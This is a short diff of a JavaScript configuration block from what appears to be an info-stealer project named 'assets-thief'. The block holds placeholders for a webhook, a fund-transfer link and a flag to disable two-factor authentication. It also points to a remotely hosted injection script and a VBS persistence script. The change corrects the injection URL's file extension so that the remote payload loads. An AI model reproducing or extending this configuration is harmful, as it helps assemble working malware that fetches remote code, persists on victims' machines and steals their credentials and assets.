@@ -21,7 +21,7 @@ var config = {
   disable2FA: "%DISABLE_2FA%",
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
-  injection_url: "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/Piro%20Asset/index.jss",
+  injection_url: "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/Piro%20Asset/index.js",
   injector_url:
     "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/Piro%20Asset/VBS_Persist.vbs",
   webhook: "%WEBHOOK%",
